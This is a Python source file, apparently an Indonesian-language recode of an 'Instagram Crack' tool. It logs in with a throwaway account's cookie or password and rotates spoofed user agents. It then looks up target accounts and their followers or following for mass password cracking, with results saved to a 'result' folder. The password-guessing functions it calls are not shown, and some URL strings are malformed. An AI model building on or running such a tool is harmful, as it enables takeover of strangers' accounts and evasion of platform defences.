import re, os, sys, json, bs4, uuid, hmac, hashlib, urllib, urllib.request, calendar, requests, random, datetime, time
from time import sleep
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from requests.exceptions import ConnectionError
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich.table import Table
from rich import print as cetak
from rich.panel import Panel as nel
from rich.table import Table as me
from rich.columns import Columns
from rich.console import Console as sol
console = Console()
from concurrent.futures import ThreadPoolExecutor as Modol
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn

internal,external,success,checkpoint,loop,following,lisensikuni,lisensiku=[],[],[],[],0,[],[],['sukses']
method, xxkontol, Meledakcik, proxxy = [], [], [], []
ugen=[]
s = requests.Session()
day = datetime.now().strftime("%d-%b-%Y")
nyMnD, nyMxD, menudump, = 5, 10, []
current_GMT = time.gmtime(time.time())
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}

B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI
H = "\033[0;92m" # HIJAU
K = "\033[0;93m" #KUNING
M = '\x1b[1;91m' # MERAH
P = "\033[0m" # PUTIH

#------------------[ WARNA FOR RICH ]-------------------#
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#------------------[ RANDOM COLOR RICH ]-------------------#
L1 = "[#875f5f]" # LIGHT
G1  = "[#ffd700]" # GOLD
M1  = "[#875fd7]" # MEDIUM GREEN
P1   = "[#FF00FF]" # PINK
W1  = "[#FFFFFF]" # WHITE
S1   = "[#87afff]" # SKY BLUE
O1   = "[#d78700]" # ORANGE3
O3   = "[#ff5fff]" # MEDIUM ORCH3

#------------------[ COLOR TABLE FOR RICH ]-------------------#
LIGHT = "#875f5f" # LIGHT
GOLD    = "#ffd700" # GOLD
MEDIUM  = "#875fd7" # MEDIUM GREEN
PINK    = "#FF00FF" # PINK
WHITE  = "#FFFFFF" # WHITE
SKY     = "#87afff" # SKY BLUE
ORNG   = "#d78700" # ORANGE3
ORCH   = "#ff5fff" # MEDIUM ORCH

X_IG_APP_ID = random.choice(["936619743392459" , "2763362503905702" , "1217981644879628"])
IG_API = 'https://i.instagram.com/api/v1/'
IG_URL = 'z.p42.www.instagram.com'

def waktu():
	now = datetime.now()
	hours = now.hour
	if 4 <= hours < 12:timenow = "Selamat Pagi"
	elif 12 <= hours < 15:timenow = "Selamat Siang"
	elif 15 <= hours < 18:timenow = "Selamat Petang"
	else:timenow = "Selamat Malam"
	return timenow
#------------------[ CLEAR-LAYAR ]-------------------#
def clear():
    try:os.system("	clear")
    except:pass

def banner():
	clear()
	prints(Panel(f"""
{B2}            ⣠⣴⣶⣶⣶⣶⣶⣶⣶⣶⣦⣄      Coder By   : InstaCrack
{B2}            ⣿⣿⣿⡿⠛⢉⡉⠛⢿⣤⣼⣿      Recode     : Meledak
{B2}            ⣿⣿⡏⢠⣾⣿⣿⣷⡄⢹⣿⣿      Status     : Premium
{P2}            ⣿⣿⣇⠘⢿⣿⣿⡿⠃⣸⣿⣿      Github     : Private
{P2}            ⣿⣿⣿⣷⣤⣈⣁⣤⣾⣿⣿⣿  
{P2}            ⠙⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠋  
""",title=f"{P2}{waktu()}",subtitle=f"Instagram Crack",width=100,padding=(0,5),style=f"bold green"))
#------------------[ PYTHON VERSION ]-------------------#
try:
	urllib_quote_plus = urllib.quote
except:
	urllib_quote_plus = urllib.parse.quote_plus

def InstaIgeh():
    rr = random.randint
    rc = random.choice
    ugents1 = f"Mozilla/5.0 (iPhone; CPU iPhone OS {str(rr(9,14))}_2_5 like Mac OS X) AppleWebKit/604.5.6 (KHTML, like Gecko) Mobile/15D60 Instagram 31.0.0.14.97 (iPhone9,1; iOS {str(rr(9,14))}_2_5; en_US; en-US; scale=2.00; gamut=wide; {str(rr(700,799))}x{str(rr(1300,1500))})"
    ugents2 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; SAMSUNG.{str(rr(111111,211111))}.SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/{str(rr(73,150))}.92.0.4515.166.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36"
    ugents3 = f"Mozilla/5.0 (Linux; Android 7.0; LGT32 Build/NRD90U; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Safari/537.36 Instagram 258.1.0.26.100 Android (24/7.0; {str(rr(200,240))}dpi; {str(rr(1100,1200))}x{str(rr(1800,1900))}; LGE/KDDI; LGT32; b5; b5; ja_JP; 412452718)"
    uacrack6 = f"Mozilla/5.0 (Linux; Android 8.0.0; ONEPLUS A5000 Build/OPR1.170623.032; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.65.0.3325.109.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 37.0.0.21.97 Android (26/8.0.0;{str(rr(200,240))}480dpi; {str(rr(1100,1200))}1080x1920{str(rr(1800,1900))}; OnePlus; ONEPLUS A5000; OnePlus5; qcom; ru_UA; 98288242)"
    ugents7 = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX1851 Build/RKQ1..{str(rr(111111,211111))}.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.95.0.4638.74.{str(rr(5500,5900))}.{str(rr(75,99))} Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/381.0.0.29.105;]"
    ugents5 = f"Mozilla/5.0 (Linux; Android 10; Infinix X682B Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.88.0.4324.93.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36 Instagram 172.0.0.21.123 Android (29/10;  {str(rr(200,240))}320dpi; {str(rr(1100,1200))}720x1464{str(rr(1800,1900))} ; INFINIX MOBILITY LIMITED/Infinix; Infinix X682B; Infinix-X682B; mt6769; tr_TR; 269790803)"
    satu = f"Mozilla/5.0 (Linux; Android 12; CPH2127 Build/RKQ1.{str(rr(211111,299999))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36"
    dua  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX3195 Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    tiga  = f"Mozilla/5.0 (Linux; Android 9; vivo 1904 Build/PPR1.{str(rr(111111,199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,99))}.0.{str(rr(4500,4900))}.{str(rr(75,150))} Mobile Safari/537.36 wkbrowser 5.0.17 {str(rr(2111111,2999999))} js 5.1.1 newfocus lng=ru"
    empat  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; RMX1811) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    lima  = f"Mozilla/5.0 (Linux; Android {str(rr(7,12))}; IN2013) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(rr(75,150))}.0.{str(rr(5111,5999))}.{str(rr(73,99))} Mobile Safari/537.36"
    UaMainn = random.choice([ugents1, ugents2, ugents3,uacrack6,ugents7,ugents5,satu,dua,tiga,empat,lima])
    return UaMainn


def cekAPI(cookie):
    user=open('.username.txt','r').read()
    try:
        check = s.get("{IG_API}users/web_profile_info/?username=%s"%(user),cookies={'cookie':cookie},headers={"user-agent":InstaIgeh(),"x-ig-app-id":X_IG_APP_ID}) # 936619743392459 , 2763362503905702 , 1217981644879628
        informasi = check.json()["data"]["user"]
        nama = informasi["full_name"]
        followers = informasi["edge_followed_by"]["count"]
        following = informasi["edge_follow"]["count"]
        external.append(f'{nama}|{followers}|{following}')
    except  (ValueError,KeyError):
        prints(Panel(f"{P2}opshh akun tumbal mu terkena checkpoint, silahkan login dengan akun lain.",width=80,style=f"bold green"));os.system('rm -rf .kukis.log rm -rf .username');exit()
    return external,user

def LoginCuyy():
    try:
        kuki=open('.kukis.txt','r').read()
    except FileNotFoundError:
        banner()
        Tabel1 = f"{H2}01\n02\n03\n04\n05"
        Tabel2 = f"{P2} Login Menggunakan Cookie ( {H2}Recommended{P2} )\nLogin Menggunakan Username & Password\nKeluar ({M2} Tools{P2}"
        Tabel3 = f"{H2}ON\n{M2}OF\n{H2}ON\n{M2}OF\n{M2}OFF"
        ColumnTabel = me()
        ColumnTabel.add_column(f"{P2}NO", style="bold green", justify='center')
        ColumnTabel.add_column(f"{P2}PILIHAN", style="bold green", justify='center',width=55)
        ColumnTabel.add_column(f"{P2}STATUS", style="bold green", justify='center')
        ColumnTabel.add_row(Tabel1,Tabel2, Tabel3)
        sol().print(ColumnTabel, justify='center',style=f"bold green")
        LoginMenu = input(f"└──╭➣  Pilih 1 Sampai 5 : ")
        if LoginMenu in [""]:prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan Sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3);LoginCuyy()
        elif LoginMenu in ["1","01"]:loginCookie()
        elif LoginMenu in ["2","02"]:loginUserPas()
        elif LoginMenu in ["3","03"]:exit()
        else:prints(Panel(f"{P2}Harap Masukan Pilihan Yang Bener Jangan sampai Salah!",width=80,padding=(0,12),style=f"bold green"));time.sleep(3);LoginCuyy()
    ex,user = cekAPI(kuki)
    cookie = {'cookie':kuki}
    Instagram(ex,user,cookie)

def loginCookie():
    try:
        kuki=open('.kukis.txt','r').read()
    except FileNotFoundError:
        prints(Panel(f"{P2}Sebelum Login Pastikan Akun Tumbal Bersifat Publik Dan Tidak Private",width=80,padding=(0,4),style=f"bold green"))
        username = input(f'└──╭➣ {H}Masukan Username :{H} ')
        cookies =input(f'{P}└──╭➣ {H}Masukan Cookie   :{H} ')
        kuki = open('.kukis.txt','w').write(cookies)
        user = open('.username.txt','w').write(username)
        time.sleep(2)
        prints(Panel(f"{P2}Login Akun Tumbal Berhasil, Silahkan Jalankan Ulang Scriptnya",width=80,padding=(0,7),style=f"bold green"));exit()
    ex,user = cekAPI(kuki)
    cookie = {'cookie':kuki}
    Instagram(ex,user,cookie)
    
C = ''

def loginUserPas():
    prints(Panel.fit(f"Menu bagian login username dan password",width=80,padding=(0,7),style=f"bold green"))
    username = input('Username : ')
    password = input('Password : ')
    request_uuid = str(uuid.uuid4())
    login_url = "https://{IG_URL}/accounts/login/ajax/"
    csrf_token = s.get(login_url).cookies["csrftoken"]
    headers = {
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "accept-encoding": "gzip, deflate, br, zstd",
        "accept-language": "en-US,en;q=0.9",
        "cache-control": "max-age=0",
        "x-csrftoken": csrf_token,
        "dpr": "2",
        "priority": "u=0, i",
        "sec-ch-prefers-color-scheme": "dark",
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "sec-fetch-site": "same-origin",
        "sec-fetch-user": "?1",
        "upgrade-insecure-requests": "1",
        "user-agent": InstaIgeh(),
        "viewport-width": "331",
    }
    payload = {
        "username": username,
        "enc_password": f"#PWD_INSTAGRAM_BROWSER:0:&:{password}",
        "queryParams": {},
        "optIntoOneTap": False,
        "trustedDeviceRecords": None, 
        "requestUUID": request_uuid, 
    }
    post = "https://{IG_URL}/accounts/login/?next=%2F_gj99%2F&source=private_profile"
    r = s.post(post, data=payload, headers=headers, allow_redirects = False)
    meledak_code = json.loads(r.text)
    if 'userId' in str(meledak_code) or 'href="https://i.instagram.com/accounts/onetap/?next=%2F"' in str(meledak_code) or 'href="https://www.instagram.com/accounts/onetap/?next=%2F"' in str(meledak_code) or 'href="https://z-p42.www.instagram.com/accounts/onetap/?next=%2F_gj99%2F"' in str(meledak_code):
        users = r["user"]
        kuki = s.cookies["sessionid"]
        open(".kukis.txt", "w").write(kuki)
        open(".username.txt", "w").write(users["username"])
        prints(Panel(f"{P2}Login Akun Tumbal Berhasil, Silahkan Jalankan Ulang Scriptnya",width=80,padding=(0,7),style=f"bold green"));
        ex,user=cekAPI(kuki)
        cookie={'cookie':kuki}
        Instagram(ex,user,cookie)
    else:
        prints(Panel(f"{P2}Login Akun Tumbal Gagal, Silahkan Coba Lagi",width=80,padding=(0,7),style=f"bold green"));exit()



class Instagram:
    def __init__(self, external, username, cookie):
        self.external = external
        self.username = username
        self.cookie = cookie
        self.s = requests.Session()
        self.logo()

    def logo(self):
        for i in self.external:
            banner()
            tabel1 = "01\n02\n03\n04\n05"
            tabel2 = (
                "Crack Dari Pengikut\nCrack Dari Mengikuti\nLihat Akun Hasil Crack\n"
                "Unfollower All\nKeluar"
            )
            tabel3 = "ON\nON\nON\nON\nON"
            colume_tabel = me()
            colume_tabel.add_column("NO", style="bold green", justify='center')
            colume_tabel.add_column("PILIHAN", style="bold green", justify='center', width=55)
            colume_tabel.add_column("STATUS", style="bold green", justify='center')
            colume_tabel.add_row(tabel1, tabel2, tabel3)
            sol().print(colume_tabel, justify='center', style="bold green")
            choice = input('└──╭➣ Pilih 1 Sampai 4: ')
            if choice == '':
                prints("Pilih Yang Benar, Jangan Kosong!")
                time.sleep(3)
                exit()
            elif choice in ('1', '01'):
                self.handle_crack_pengikut()
            elif choice in ('2', '02'):
                self.handle_crack_mengikuti()
            elif choice in ('3', '03'):
                self.handle_hasil_crack()
            elif choice in ('4', '04'):
                self.handle_unfollow()
            elif choice in ('5', '05'):
                self.exit_program()
            else:
                self.logo()
    def handle_unfollow(self):
        tes = '/api/v1/web/friendships/{user_id}/remove_follower/'

    def handle_crack_pengikut(self):
        mas = input('└──╭➣ Apakah Anda Ingin Crack Masal Y/t: ')
        if mas.lower() == 'y':
            try:
                jumlah_target = int(input('└──╭➣ Jumlah Target: '))
            except ValueError:
                jumlah_target = 1

            prints("Pastikan Username Target Bersifat Publik dan Jangan Private")
            for _ in range(jumlah_target):
                target = input('└──╭➣ Username Target: ')
                user_id = self.idAPI(self.cookie, target)
                info = self.infoAPI(self.cookie, user_id)
                self.passwordAPI(info)

    def handle_crack_mengikuti(self):
        mas = input('└──╭➣ Apakah Anda Ingin Crack Masal Y/t: ')
        if mas.lower() == 'y':
            try:
                jumlah_target = int(input('└──╭➣ Jumlah Target: '))
            except ValueError:
                jumlah_target = 1

            prints("Pastikan Username Target Bersifat Publik dan Jangan Private")
            for _ in range(jumlah_target):
                target = input('└──╭➣ Username Target: ')
                user_id = self.idAPI(self.cookie, target)
                info = self.infoAPI(self.cookie, user_id, following=True)
                self.passwordAPI(info)

    def handle_hasil_crack(self):
        for result_file in os.listdir('result'):
            prints(f"Hasil Crack: {result_file}")
            file_name = input('└──╭➣ Masukkan Nama File: ')
            with open(f'result/{file_name}') as f:
                lines = f.read().splitlines()

            for line in lines:
                data = line.split('|')
                prints(data)

    def exit_program(self):
        confirm = input("└──╭➣ Apakah Anda Yakin Ingin Keluar? Y/t: ")
        if confirm.lower() == 'y':
            os.system("rm -rf .kukis.txt .username.txt")
            prints("Sukses Menghapus Cookie. Terima Kasih!")
            time.sleep(2)
            exit()
        else:
            self.logo()

    def idAPI(self, cookie, target):
        try:
            response = self.s.get(
                f"{IG_API}users/web_profile_info/?username={target}",
                cookies = cookie,
                headers={
                    "user-agent": InstaIgeh(),
                    "x-ig-app-id": X_IG_APP_ID
                })
            user_data = response.json()["data"]["user"]
            user_id = user_data["id"]
        except requests.exceptions.ConnectionError:
            exit("\n[!] Koneksi internet bermasalah")
        except (json.decoder.JSONDecodeError, KeyError, AttributeError):
            exit("[!] Cookie checkpoint")
        except Exception as e:
            exit(f"[!] Username tidak ditemukan atau target tidak publik: {e}")
        return user_id